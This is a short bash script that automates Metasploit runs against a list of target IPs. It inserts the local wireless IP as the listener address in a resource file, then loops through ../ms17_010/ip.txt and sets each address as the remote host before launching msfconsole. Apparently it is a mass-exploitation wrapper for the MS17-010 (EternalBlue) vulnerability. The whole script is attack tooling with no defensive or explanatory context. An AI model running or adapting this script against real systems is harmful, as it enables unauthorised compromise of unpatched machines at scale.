#!/bin/bash
ifconfig wlan0 | grep inet | sed '$d' | sed -e 's/^[ \t]*//' | sed 's/[^ ]* //' | sed 's/\s.*$//' > myip.txt
echo "set lhost $(cat myip.txt)" > spoofip.txt
sed -i "7s/.*/$(cat spoofip.txt)/" automsfe.rc
w=$(wc -l < ip.txt)
for ((j=1;j<=w;j+=1))
do
sed $j'!d' ../ms17_010/ip.txt >target.txt 2> /dev/null;
R=$(<target.txt);
sed -i '3s/.*/set rhost '$R' /' automsfe.rc
msfconsole -q -r  ../ms17_010/automsfe.rc
done
exit


